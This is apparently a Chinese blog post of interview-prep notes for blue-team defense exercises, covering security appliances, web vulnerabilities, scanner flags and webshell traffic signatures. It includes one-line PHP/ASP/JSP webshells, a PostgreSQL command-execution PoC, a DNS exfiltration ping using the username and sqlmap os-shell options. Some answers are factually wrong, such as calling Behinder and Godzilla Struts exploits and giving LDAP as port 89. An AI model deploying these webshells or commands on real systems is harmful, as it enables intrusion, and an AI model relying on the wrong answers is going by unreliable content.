---
title: HW prepare
date: 2023-04-12 21:20:31
excerpt: HW prepare
categories: 学习
---

# HW prepare

### 对hw的理解

我个人觉得护网行动是国家重视网络安全的一种体现，目的是发现企业政府安全问题并解决，提供安全能力

hw分为蓝队防守方和红队攻击方



### hw防守人员组成

监控组：监控组主要就是对WAF、IPS等安全设备进行7*24小时监控、派发、跟踪、反馈安全威胁

研判组：研判组主要是技术支撑，对于监控组发现的攻击行为进行技术研判

网络处置组：网络处置组主要职责就是发现攻击时在防火墙上对攻击方进行IP封锁，溯源等等

应用处置组：应用处置组主要就是对发现的攻击和漏洞进行风险处置、安全加固



### 安全产品了解哪些

- 防火墙一般不属于区域的边界，如数据中心中核心区域和业务区域的边界防火墙、园区网络边界防火墙等，主要做保证边界安全
- 抗D也叫抗DDOS设备即流量清洗设备，一般部署与网络最外侧，防止大规模僵尸网络入侵，内部有一套完整的机制可以区分哪些流量是用户正常流量和僵尸网络流量，可以保障数据中心可以提供完整的数据中心服务；
- 负载均衡设备分为全局负载均衡（GLB）和链路负载均衡（LLB）以及服务器负载均衡（SLB）。GLB可以保障用户可以访问就近的数据中心提供的服务资源，LLB可以保障流量的出栈负载均衡和入栈负载均衡。SLB可以保障服务器对外服务的时候负载更平均、可靠；
- WAF即[web应用防火墙](https://cloud.tencent.com/product/waf?from=20065&from_column=20065)，可以防止网站挂马保障网页安全，部署在WEB服务器区域；
- 数据库审计设备是把对数据库所有的操作记录下来，方便后期溯源审计和责任明确，部署在运维管理区域或者数据库审计区域均可。
- 漏扫即[漏洞扫描](https://cloud.tencent.com/product/vds?from=20065&from_column=20065)就是给系统做体检，可以扫描出操作系统漏洞、数据库漏洞、WEB漏洞，方便管理员对暴露出的漏洞情况进行安全加固。一般部署在安全检测区域。
- 网页防篡改一般和WAF配合使用，保护web网页不被黑客篡改，如果被篡改了，那结果仍然可以显示篡改前的正常页面，在政府行业用的最多。一般是软件直接安装在WEB服务器上。
- 上网行为管理设备说白了是可以记录员工的上网行为，包括浏览网页的地址、检索内容、聊天记录等，一般旁挂于核心交换机。
- 堡垒机即运维审计设备，所有涉及到登录设备（如服务器、存储、交换机、防火墙等ICT产品）的操作都要先登录到堡垒机统一登录入口。同时所有的操作都会被审计下来，方便后期溯源取证。

### 

### pdf解析有没有可能存在xxe

是的，PDF 解析器可能存在 XXE（XML 外部实体注入）漏洞。这是因为 PDF 格式支持内嵌 XML 数据，并且一些 PDF 解析器可能会对这些数据进行处理，其中可能包含 XML 实体。



### http协议里面method和data

方法	描述	是否包含主体
GET	从服务器获取一份文档	否
HEAD	只从服务器获取文档的首部	否
POST	向服务器发送带要处理的数据	是
PUT	将请求的主体部分存储在服务器上	是
TRACE	对可能经过代理服务器传送到服务器上去的报文进行追踪	否
OPTIONS	决定可以在胀务器上执行哪些方法	否
DELETE	从服务器上删除一份文档	否



### 威胁情报告警如何判断





### 网络攻击类的告警要怎么判断



### sql注入的修复方式

- SQL语句预编译
- 针对SQL输入内容进行限制、过滤 //目前使用WAF对这一块进行处理
- 针对提交的关键数据进行转义 ，比如\select
- 关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等
- 数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作
- 敏感信息严格加密处理



### 网络攻击的方向来自哪三个方向



### 如何判断攻击是不是误报



### DNS外带存在哪些漏洞

- sql盲注

- XSS

- 命令执行

- windows可以查询主机用户名等

  ping %USERNAME%.XXX.CEYE.IO

- xxe

- ssrf



### 什么是攻防演练

网络安全实战攻防演练是以获取指定目标系统（标靶系统）的管理权限为目标的攻防演练，由攻防领域经验丰富的红队专家组成攻击队，在保障业务系统稳定运行的前提下，采用“不限攻击路径，不限制攻击手段”的贴合实战方式，而形成的“有组织”的网络攻击行动。攻防演练通常是在真实网络环境下对参演单位目标系统进行全程可控、可审计的实战攻击，拟通过演练检验参演单位的安全防护和应急处置能力，提高网络安全的综合防控能力。



### 怎么判断socket代理

> 通过 Websocket 的 bufferedAmount 来探测用户是否采用来代理
>
> 1. Client 通过 Websocket 与 Server 建立连接
> 2. Server 监听到 connect 事件后，将本次 TCP 的 window size 设置为 0，这也就意味着 Client 无法继续将数据包传给 server
> 3. Client 使用 websocket.send()持续发送几个包
> 4. 在 Client 上观察 websocket.bufferedAmount 值，如果过了一会，这个值一直在增大，说明无代理，否则存在代理
>    为啥可以通过这个值来判断呢？这是因为代理工具一般不会转发 TCP 的设置，也就是说，开启了代理的 Client 发出的包会被代理给吃掉



### 一句话木马

```
<?php @eval($_POST[1]);?>    php
<%eval request("chopper")%>   asp
 <%Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));%>  jsp

```



### 社工手段有哪些

- 邮件钓鱼 
- 伪装成熟人



### fastjson



### 客服有映射到外网的服务器被打进来了，如何溯源



### 常见的中间件漏洞

IIS

- 解析漏洞
- put任意文件写入
- 段文件漏洞

apache

- 未知扩展名解析漏洞
- addhandler导致的解析漏洞
- 换行解析漏洞

nginx

- 解析漏洞
- 空字节任意代码执行
- 文件名逻辑漏洞‘
- 配置错误导致的安全问题

tomcat

- 任意文件写入
- 远程代码执行
- 弱口令+后台getshell

jboss

- 反序列化漏洞
- 弱口令

### ngsoc冷热数据

奇安信网神态势感知与安全运营平台（简称NGSOC）



### 代理工具类告警，流量特征



### 你感觉windows漏洞多还是linux漏洞多

个人觉得linux漏洞多，debian linux漏洞最多



### 永恒之蓝

2017年

用Windows系统的SMB协议漏洞来获取系统的最高权限 139，445端口



### sql注入写文件

load_file()读文件 into outfile / into dumpfile写文件



### 正向代理反向代理

正向代理代理的对象是客户端，反向代理代理的对象是服务端。



### 延时注入在流量告警上如何判断的



### 宽字节

一个字符数大小为两个字节的为宽字节，比如GBK编码，我们汉字通常使用的就是GBK编码，也就是说一次性会读取两个字节。

当我们的mysql使用GBK编码后，同时两个字符的前一个字符ASCII码大于128时，会将两个字符认成一个汉字



### 流量代理工具有哪些

vpn，Shadowsocks，Trojan，WireGuard



### 冰蝎与哥斯拉的连接特征

冰蝎和哥斯拉都是利用远程管理工具（如Apache Struts漏洞）进行攻击，然后利用远程桌面协议（RDP）或SSH进行横向移动。

都能够进行远程控制

都可以进行数据窃取

使用加密通信



### 怎么判断逻辑漏洞是否攻击成功

1. 行为变化：逻辑漏洞攻击成功后，攻击者可能会进行一些行为变化，比如访问一些不应该被访问的资源，或者执行一些不应该被执行的操作。
2. 数据变化：逻辑漏洞攻击成功后，攻击者可能会修改、删除或者新增某些数据。
3. 系统响应：逻辑漏洞攻击成功后，系统可能会出现异常响应，比如返回异常的HTTP状态码或者错误信息。
4. 安全日志：逻辑漏洞攻击成功后，可能会在系统的安全日志中留下痕迹，比如异常访问记录、错误日志等。





### sql注入修复方式

- SQL语句预编译
- 针对SQL输入内容进行限制、过滤 //目前使用WAF对这一块进行处理
- 针对提交的关键数据进行转义 ，比如\select
- 关闭错误信息输出 ，因为有些错误返回信息，会返回物理路径、数据库版本信息等
- 数据库权限严格控制 ，不同级别的用户，只能进行相应级别权限的操作
- 敏感信息严格加密处理



### 天眼与ngsoc区别

NGSOC主要应用于较为复杂、高风险的网络环境，如金融机构、能源公司等，其主要优点是可以集成多种不同的安全监测工具，实现信息的智能化分析和响应；而天眼则更加注重对企业内部网络资产的保护，具备网络漏洞检测和入侵攻击检测等多种功能。



### 文件上传漏洞如何防御

- 检查文件上传路径 ( 避免 0x00 截断、 IIS6.0 文件夹解析漏洞、目录遍历 )

- 文件扩展名检测 ( 避免服务器以非图片的文件格式解析文件 ),验证文件扩展名 通常有两种方式 : 黑名单和白名单 .

- 文件 MIME验证 ( 比如 GIF 图片 MIME为 image/gif,CSS 文件的 MIME为 text/css 等 ) 3. 文件内容检测 ( 避免图片中插入 webshell)

- 图片二次渲染 ( 最变态的上传漏洞防御方式 , 基本上完全避免了文件上传漏洞 )

- 文件重命名 ( 如随机字符串或时间戳等方式 , 防止攻击者得到 webshell 的路径 )

- 隐藏上传路径



### xff

x-forwarded-for 表了HTTP的请求端真实的IP

可以进行sql注入



### sql注入写文件前提

- 对web目录具有读写权限
- 知道文件绝对路径
- 能够使用联合查询（sql注入时）
- secure_file_priv，File_priv



### sqlmap一些参数

```
-h                  输出参数说明
-hh                 输出详细的参数说明
-v                  输出级别（0~6，默认1）
-u url              指定url
--data=DATA         该参数指定的数据会被作为POST数据提交
-r file.txt         常用于POST注入或表单提交时注入
-p / --skip         指定/跳过测试参数
--cookie            设置cookie
--force-ssl         强制使用SSL
--threads           指定线程并发数
--prefix            指定前缀
--suffix            指定后缀
--level             检测级别（1~5，默认1）
--risk              风险等级（1~4，默认1）
--all               列举所有可访问的数据（不推荐）
--banner            列举数据库系统的信息等
--current-user      输出当前用户
--current-db        输出当前所在数据库
--hostname          输出服务器主机名
--is-dba            检测当前用户是否为管理员
--users             输出数据库系统的所有用户
--dbs               输出数据库系统的所有数据库
-D DB               指定数据库
--tables            在-D情况下输出库中所有表名
-T table            在-D情况下指定数据表
--columns           在-D -T情况下输出表中所有列名
-C column           在-D -T情况下输出某列数据的值
--dump              拉取数据存放到本地
--dump-all          拉取所有可访问数据存放到本地
--count             输出数据条目数量
--search            搜索数据库名、表明、列名，需要与-D -T或-C 联用
--sql-query         执行任意的SQL语句
--sql-shell         使用交互式SQL语句执行环境
--flie-read         读取文件
--file-write        上传文件（指定本地路径）
--file-dest         上传文件（指定目标机器路径）
--os-cmd            执行任意系统命令
--os-shell          使用交互式shell执行命令
--batch             所有要求输入都选取默认值
--wizard            初学者向导
```





### csrf

攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作

CSRF 攻击的三个条件 :

       1 . 用户已经登录了站点 A，并在本地记录了 cookie
    
       2 . 在用户没有登出站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。
    
       3 . 站点 A 没有做任何 CSRF 防御

**漏洞检测**

检测CSRF漏洞最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。



**防御**

1. 验证 HTTP Referer 字段；
2. 在请求地址中添加 token 并验证；
3. 在 HTTP 头中自定义属性并验证；
4. Chrome 浏览器端启用 SameSite cookie



### ssrf

服务端请求伪造(Server-Side Request Forgery),指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。

防御

1、过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。

2、统一错误信息，避免用户可以根据错误信息来判断远程服务器的端口状态。

3、限制请求的端口，比如80,443,8080,8090。

4、禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。

5、使用DNS缓存或者Host白名单的方式。



### 水坑漏洞

水坑攻击（Watering Hole Attack）”是一种网络攻击方式。攻击者通过在特定网页中植入恶意代码，来攻击访问该网页的用户

防御

（1）    及时更新操作系统及应用程序，修复已知漏洞；

（2）    安装可以信赖的安全软件，及时发现网页浏览过程中的异常行为；

（3）    监测所有网络传输流量，及时发现异常通信；



### 鱼叉攻击

鱼叉攻击，肯定是有看到了鱼再叉，也就是有针对性的攻击，目标明确，比如公司或团体，给这些特定团体发送包含木马的邮件，这种邮件要让受害者打开，就需要一个欺骗和迷惑的标题。这个题目和内容的构造就考验红方的想象力了。比如打补丁的通知邮件，放假通知安排，投诉举报，简历投递或者来点公司的劲爆信息引爆吃瓜群众。员工点了附件之后，就中了木马，黑客在远端就可以远程控制这个电脑了。

### tomcat可以执行的后缀名

jsp html htm js css xml gif jpg png pdf doc xls

### ssrf有哪些协议

http https ftp smtp dns file 



### mysql数据库系统执行函数



### nmap参数

- -sS 半开扫描(TCP SYN扫描)，执行速度快，不容易被注意到，可以避免被记入目标系统的日志，需要root权限。它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。
- -sT 当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描。会在⽬标主机的⽇志中记录⼤批连接请求和错误信息，但是由于是tcp connect()扫描，容易被记录。当SYN扫描可用时，它通常是更好的选择
- -sP ping扫描，Nmap在扫描端⼜时，默认都会使⽤ping扫描，只有主机存活，Nmap才会继续扫描。
- -sU UDP扫描，但UDP扫描是不可靠的，速度也比较慢
- -sA 这种扫描与目前为止讨论的其它扫描的不同之处在于 它不能确定open(开放的)或者 open|filtered(开放或者过滤的))端口。 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。
- -sV 探测端⼜服务版本
- -Pn 扫描之前不需要⽤ping命令，有些防⽕墙禁⽌ping命令。可以使⽤此选项进⾏扫描
- -v 显⽰扫描过程，推荐使⽤
- -p 指定端⼜，如“1-65535、1433、135、22、80”等
- -O 启⽤远程操作系统检测，存在误报
- -O --osscan-limit 针对指定的目标进行操作系统检测
- -O --osscan-guess 当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认 进行这种匹配
- -A 全⾯系统检测、启⽤脚本检测、扫描等
- -oN/-oX/-oG 将报告写⼊⽂件，分别是正常、XML、grepable 三种格式
- -iL 读取主机列表，例如，-iL “C:\ip.txt”



### 天眼可以检测逻辑漏洞吗

天眼的漏洞扫描模块主要基于静态代码分析和黑盒测试技术，对于逻辑漏洞的检测能力相对有限。



### 内网渗透工具，代理



### 渗透测试流程

- 确定目标和范围：定义渗透测试的目标和范围，包括要测试的系统、应用程序、网络、物理设施等。
- 收集情报：收集有关目标系统的信息，例如 IP 地址、操作系统类型、应用程序版本、网络拓扑等，以便进行后续测试。
- 漏洞扫描：使用漏洞扫描工具对目标系统进行扫描，以发现已知的漏洞和弱点。
- 渗透测试：通过手动测试和自动化工具进行渗透测试，包括尝试各种攻击向量，如 SQL 注入、XSS 攻击、文件包含漏洞、社交工程等。
- 提交漏洞报告：将发现的漏洞和安全弱点整理成报告，详细描述漏洞的影响和风险，并提供建议和修复措施。
- 清理痕迹：在测试完成后，清除所有测试过程中留下的痕迹，确保不会对目标系统造成任何影响或损害。
- 重复测试：在修复漏洞后，进行重复测试以确认漏洞已被修复，并且没有引入新的漏洞。



### 天眼日志分析语法                                                                                                     

天眼日志分析语法（TianEye Log Query Syntax）是指在奇安信的天眼平台上，用于查询、分析和可视化各种日志数据的语法。以下是一些常见的天眼日志分析语法示例：

1. 关键字查询：使用关键字查询指定时间段内的日志数据。例如，查询访问时间为2022年4月1日至4月30日之间的所有日志：

```
index=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30
```

精确匹配查询：使用精确匹配查询指定某个字段的值。例如，查询客户端 IP 地址为 192.168.1.100 的所有日志：

```
index=xxx sourcetype=yyy client_ip=192.168.1.100
```

多条件查询：使用多个条件查询组合查询结果。例如，查询客户端 IP 地址为 192.168.1.100，且访问时间为2022年4月1日至4月30日之间的所有日志：

```
index=xxx sourcetype=yyy client_ip=192.168.1.100 access_time>=2022-04-01 access_time<=2022-04-30
```

聚合查询：使用聚合函数统计查询结果。例如，查询某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：

```
index=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | top 10 client_ip
```

可视化查询：使用可视化组件将查询结果可视化。例如，使用柱状图可视化某个时间段内 HTTP 访问次数最多的前 10 个客户端 IP 地址：

```
index=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | 
```

### 天眼流量分析和威胁检测区别

天眼流量分析和威胁检测是奇安信的天眼平台提供的两个不同的功能模块，它们的主要区别如下：

1. 功能目标不同：天眼流量分析的主要目标是分析网络流量，了解网络拓扑结构、通信情况和性能状况，发现网络异常和瓶颈问题等；而威胁检测的主要目标是检测和预防网络威胁和攻击，包括漏洞扫描、入侵检测、恶意代码检测、网络流量分析等多个方面。
2. 数据来源不同：天眼流量分析主要关注网络流量数据，可以采集和分析网络设备、流量数据、协议、应用等方面的数据；而威胁检测则需要多种数据源的支持，如安全事件日志、主机安全数据、网络安全数据、终端安全数据等。
3. 数据处理方式不同：天眼流量分析主要采用流量抓包、协议解析、拓扑分析等技术进行数据处理和分析；而威胁检测则采用多种技术手段进行数据处理和分析，如恶意代码识别、行为分析、异常检测、漏洞扫描等。
4. 应用场景不同：天眼流量分析主要适用于网络运维、网络性能分析、网络安全监控等领域；而威胁检测则适用于网络安全、信息安全等领域，可以帮助企业发现和防范各种网络威胁和攻击。



### 天眼可以审0day吗

不可以

### 怎么判断自己的机器是不是域控

1. 打开计算机管理器：在 Windows 操作系统中，可以通过在开始菜单中搜索“计算机管理器”来打开计算机管理器。
2. 查看域：在计算机管理器中，展开“本地用户和组”或“计算机管理”等选项卡，然后选择“域”。如果机器加入了域并成为域控制器，将会在此处看到域的名称和其他域控制器的信息。
3. 检查服务：在 Windows 操作系统中，域控制器会运行一些特定的服务，比如“Active Directory域服务”，“DNS服务器服务”等。可以通过打开“服务”选项卡来查看这些服务是否在运行，并且是否是自动启动。
4. 检查系统信息：在 Windows 操作系统中，可以通过打开“系统信息”来查看机器的详细信息。在其中的“系统摘要”选项卡中，如果机器是域控制器，将会看到“角色”一栏显示“域控制器”。

### 常见webshell流量体征

- 异常流量：Webshell的流量通常会显示为异常流量，因为攻击者通常会通过Webshell上传和下载文件、执行命令等操作，这些操作都会产生大量不正常的流量。
- 带有特定字符或字符串：Webshell可能会带有特定字符或字符串，如“eval(base64_decode(”，这些字符或字符串用于解码Webshell的命令或脚本，攻击者可能会使用这些字符或字符串来隐藏Webshell。
- 频繁访问：Webshell的访问可能会比正常的用户访问频率更高，这是因为攻击者需要不断访问Webshell以获取控制目标服务器的权限。
- 长时间运行的连接：Webshell的流量可能会包含长时间运行的连接，这是因为攻击者通常会保持Webshell的连接以便在需要时执行更多的操作。
- 异常文件：Webshell可能会通过上传和下载文件来执行操作，因此出现异常文件或文件类型也可能是Webshell的流量体征。



### 常用数据库默认端口及漏洞

- 89 端口（ldap）安全漏洞：未授权访问 、弱口令
  利用方式：通过LdapBrowser工具直接连入。
- 1433 端口（Mssql）安全漏洞：弱口令、暴力破解
  利用方式：差异备份getshell、SA账户提权等

- 1521 端口（Oracle）安全漏洞：弱口令、暴力破解
  利用方式：通过弱口令/暴力破解进行入侵。

- 3306 端口（MySQL）安全漏洞：弱口令、暴力破解
  利用方式：利用日志写入webshell、udf提权、mof提权等。

- 5432 端口（ PostgreSQL）安全漏洞：弱口令、高权限命令执行
  利用方式：攻击者通过弱口令获取账号信息，连入postgres中，可执行系统命令。PoC参考： DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM ‘id’; SELECT * FROM cmd_exec;

- 5984 端口（CouchDB）安全漏洞：垂直权限绕过、任意命令执行
  利用方式：通过构造数据创建管理员用户，使用管理员用户登录，构造恶意请求触发任意命令执行。后台访问：http://:5984/_utils

- 6379 端口（Redis）安全漏洞：未授权访问
  利用方式：绝对路径写webshell 、利用计划任务执行命令反弹shell、公私钥认证获取root权限、主从复制RCE等。

- 9200 端口（elasticsearch）安全漏洞：未授权访问、命令执行

### 目标ip是邮件服务器要怎么处理

1. 检查邮件服务器是否正常运行：您可以通过尝试连接到邮件服务器并发送一封电子邮件来检查邮件服务器是否正常运行。如果邮件服务器无法连接或无法发送电子邮件，则可能需要检查邮件服务器的配置或网络设置。
2. 检查安全设置：邮件服务器需要设置安全措施以保护电子邮件和用户数据，如防火墙、反病毒软件和邮件过滤器等。您可以检查这些设置是否已启用或需要进行更新。
3. 更新邮件服务器软件：如果您的邮件服务器软件已经过时，可能需要更新到最新版本以修复可能存在的安全漏洞和错误。
4. 监控邮件服务器流量：监控邮件服务器的流量可以帮助您识别和防止未经授权的访问或攻击。您可以使用日志分析工具或流量监控工具来监控邮件服务器的流量，并检查是否存在异常活动。
5. 增强安全措施：除了基本的安全措施，您还可以考虑增强邮件服务器的安全措施，如强密码策略、多因素身份验证和加密等。这些措施可以帮助保护邮件服务器免受恶意

### 目的ip是114.114.114.114端口是53需要封禁吗



### 群里面遇到exe可执行程序怎么处理

1. 不要下载或运行未知来源的可执行程序。如果你不确定该程序是否安全，请询问发送者或其他群组成员。
2. 使用杀毒软件进行扫描。如果你已经下载了该程序并想运行它，可以使用杀毒软件进行扫描，以确保它不包含任何恶意软件。
3. 隔离该文件。如果你怀疑该程序可能会造成破坏，请将其隔离在一个安全的位置，以防止其对你的计算机系统造成任何影响。
4. 通知管理员。如果你认为该程序可能会对其他群组成员造成威胁，请及时通知管理员或相关人员，并让他们采取适当的措施来处理该问题。
5. 虚拟机打开

### 遇到远控木马告警如何处理

1. 立即断开网络连接。为了防止该木马进一步攻击计算机或服务器，你应该立即断开网络连接，包括断开无线网络和网线连接等。
2. 扫描计算机或服务器。使用安全软件对计算机或服务器进行全面扫描，以检测和清除远控木马。确保使用更新的杀毒软件，以提高检测和清除恶意软件的能力。
3. 更改密码。更改所有重要帐户的密码，例如电子邮件、在线银行、社交媒体等。确保密码是复杂且难以猜测的，建议使用密码管理器。
4. 及时备份数据。备份所有重要数据，包括文件、文档、照片等，以防止数据丢失。
5. 更新操作系统和软件。确保计算机或服务器上的操作系统和所有软件都是最新的，以填补可能的安全漏洞。
6. 通知安全管理员。如果你在工作环境中发现远控木马，应立即通知安全管理员或信息安全团队，并遵循公司的安全政策和流程。



### cs

一款渗透测试神器

https://blog.csdn.net/zzwwhhpp/article/details/111773395



### wireshark过滤条件

ip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107

或者

ip.addr eq 192.168.1.107 // 都能显示来源IP和目标IP



tcp.port eq 80 // 不管端口是来源的还是目标的都显示

tcp.port == 80

tcp.port eq 2722

tcp.port eq 80 or udp.port eq 80

tcp.dstport == 80 // 只显tcp协议的目标端口80

tcp.srcport == 80 // 只显tcp协议的来源端口80

 udp.port eq 15000

 过滤端口范围

tcp.port >= 1 and tcp.port <= 80




th.dst == A0:00:00:04:C5:84 // 过滤目标mac

eth.src eq A0:00:00:04:C5:84 // 过滤来源mac

eth.dst==A0:00:00:04:C5:84

eth.dst==A0-00-00-04-C5-84

eth.addr eq A0:00:00:04:C5:84 // 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的



http.request.method == “GET”

http.request.method == “POST”

http.request.uri == “/img/logo-edu.gif”

http contains “GET”

http contains “HTTP/1.”



### shiro反序列化漏洞

1.1.3 漏洞原理

  Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时：

攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令

### 蚁剑流量特征

1.默认的 user-agent 请求头是 antsword xxx（可修改）

 2.蚁剑的正文内容用URL加密，解密后流量最中明显的特征为ini_set("display_errors","0");



### 勒索病毒传播方式有哪些

- 网站挂马：用户浏览挂有木马病毒的网站，上网终端计算机系统极可能被植入木马并感染上勒索病毒。
- 邮件传播：攻击者通过利用当前热门字样，在互联网上撒网式发送垃圾邮件、钓鱼邮件，一旦收件人点开带有勒索病毒的链接或附件，勒索病毒就会在计算机后台静默运行，实施勒索。
- 漏洞传播：攻击者通过计算机操作系统和应用软件的漏洞攻击并植入病毒，最典型的案例是2017年在国内泛滥的WannaCry大规模勒索事件，攻击者正是利用微软445端口协议漏洞，进行感染传播网内计算机。
- 捆绑传播：攻击者将勒索病毒与其他软件尤其是盗版软件、非法破解软件、激活工具进行捆绑，从而诱导用户点击下载安装，并随着宿主文件的捆绑安装进而感染用户的计算机系统。
- 介质传播：攻击者通过提前植入或通过交叉使用感染等方式将携有勒索病毒的U盘、光盘等介质进行勒索病毒的移动式传播。

### log4j漏洞

该漏洞的主要原因是log4j在日志输出中，未对字符合法性进行严格的限制，执行了JNDI协议加载的远程恶意脚本，从而造成RCE



### wireshark抓到数据包之后你怎么去分析



### redis mongodb端口号

redis 6379   

mongoDB 27017



### 天眼探针有什么功能



### 天眼能否检索网络日志



### struct2命令执行漏洞

Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令



### 如果目的端口为: x.X.x.x,操作系统win7或者win8，检索语句要怎么写



### 怎么写模糊查询告警类型为写入文件的检索语句



### 如果出现两条相同的sql注入告警你会怎么处理



### 如果出现蠕虫病毒告警，如何处理



### php命令执行函数

**system()，passthru()，exec()，pcntl_exec()，shell_exec()，popen()/proc_popen()，反引号 ``**



### 冰蝎流量特征

Accept: application/json, text/javascript, */*; q=0.01

Content-type: Application/x-www-form-urlencoded

冰蝎设置了10种User-Agent,每次连接shell时会随机选择一个进行使用。

冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。

$post=Decrypt(file_get_contents("php://input"));



### 哥斯拉流量特征

Accept为text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2

cookie中分号结尾

和请求体一样，请求响应体也分两个格式，base64编码的和原始加密raw数据。如果请求体采用base64编码，响应体返回的也是base64编码的数据。在使用base64编码时，响应体会出现一个很明显的固定特征。这个特征是客户端和服务端编写的时候引入的。

从代码可以看到会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。
从响应数据包可以明显看到这个特征，检测时匹配这个特征可以达到比较高的检出率，同时也只可以结合前面的一些弱特征进行检查，进一步提高检出率。因为md5的字符集范围在只落在0123456789ABCDEF范围内，因此很容易去匹配，正则匹配类似于(?i:[0-9A-F]{16})[\w+/]{4,}=?=?(?i:[0-9A-F]{16})。需要注意的是md5需要同时匹配字母大小写两种情况，因为在JAVA版webshell响应中为大写字母，在PHP版中为小写字母。



### 发现有入侵攻击，查看主机的哪些日志

/var/log/



### 如何防范反序列化漏洞

防范反序列化漏洞的方法主要包括以下几点：

1. 输入过滤：在接收用户输入时，进行有效性验证和输入过滤，避免恶意输入。
2. 对象序列化前加密：对即将进行序列化的对象中的敏感数据或者方法进行加密处理，避免序列化后数据被篡改。
3. 签名校验：利用数字签名技术，在序列化和反序列化的过程中添加签名机制，校验序列化对象是否经过篡改。
4. 更新库文件：定期更新使用的序列化库文件，避免因为库文件中的漏洞而导致反序列化漏洞的产生。
5. 减少依赖第三方类库：减少依赖第三方类库的情况，避免由于第三方类库中的漏洞而导致反序列化漏洞的产生。
6. 最小化序列化：精简序列化对象中的属性，避免不必要的属性被序列化，从而降低反序列化的风险。

以上是防范反序列化漏洞的一些基本方案。此外，如果使用的是Java语言，还可以通过Java Security Manager来控制反序列化操作的权限。在开发项目时，应该尽可能地避免使用Java反序列化操作，或者在进行序列化和反序列化操作时，更加谨慎的写好对应的代码和相关配置。



### 天眼上显示多个不同url的SQL注入告警，可能是什么原因？

可能是网站存在多个不同的漏洞点，或者攻击者利用了不同的注入方式和参数来尝试注入，导致出现多个不同的SQL注入告警。此外，也有可能是天眼扫描器在扫描过程中出现了误报或者漏报情况，需要对告警进行仔细分析和验证。建议及时修复漏洞点，防范SQL注入等安全威胁。



### 我们在天眼上遇到文件上传告警时，应急响应的流程是怎样的？ 同一台资产多次发出同一个告警，可能的原因？

应对文件上传告警的应急响应流程一般包括如下步骤：

1. 确认告警情况：查看告警详细信息，包括文件类型、大小、上传时间、上传者、上传路径、上传方式、来源IP等，判断是否存在风险。
2. 暂停上传功能：对于存在风险的上传功能，需要暂停上传功能，防止攻击者持续上传。
3. 验证漏洞点：对上传功能进行全面测试，确认漏洞点，包括上传参数的类型、限制、验证等。
4. 修复漏洞点：根据漏洞点的验证结果，提供相应的解决方案和实施措施，比如对上传文件进行类型、大小、扩展名、后缀名等多个方面的限制。
5. 监测告警情况：在上传功能修复后，需对文件上传行为进行全面监测，查看是否仍然存在风险。

同一台资产多次发出同一个告警可能是以下原因：

1. 真实存在的漏洞：同一漏洞点被攻击者利用多次，导致多次告警。
2. 系统误报：扫描器或监测设备存在误报，由于告警下发频繁，导致同一漏洞多次告警。
3. 前置设备异常：网络设备、WAF等前置设备异常，导致同一个请求被多次拦截，产生多次告警。

在排查告警原因时，需要进行仔细分析和判断，以确认是否存在真实风险。需要及时对真实漏洞进行修复和防范，对于误报和异常情况则需要针对性的进行排查和修复。



### linux临时文件位置

在Linux系统中，临时文件通常放置在以下几个目录中：

1. /tmp目录：该目录是Linux系统中最常用的临时文件目录之一，任意用户都可以在该目录中创建、修改、删除文件。该目录下的文件在系统重启后会被清空。
2. /var/tmp目录：该目录和/tmp目录类似，不同之处在于该目录下的文件在系统重启后不会被清空，需要手动删除。
3. /dev/shm目录：该目录是一个ramfs文件系统，在内存中创建一个文件系统，并且把该文件系统挂载到/dev/shm目录下。该目录也可以作为临时文件目录使用，因为文件在内存中创建，所以读写速度较快。

除了上述目录之外，还有一些应用程序会自己创建临时文件目录，例如Apache创建的临时文件夹为/var/cache/httpd，Nginx创建的临时文件目录为/var/run/nginx/client_body_temp。

需要注意的是，在使用临时文件时，应尽可能使用系统默认的临时文件目录，避免用在不安全或者没有权限控制的目录。临时文件的权限也应该设置为仅能被创建者和目录管理员使用，并尽可能定期清理，以降低系统安全风险。



### 使用天眼遇到sql告警怎么处理

处理天眼上的SQL告警，一般需要按照以下步骤进行：

1. 核实告警：对收到的告警首先进行核实，查看告警详情以确认告警是否为真实漏洞。
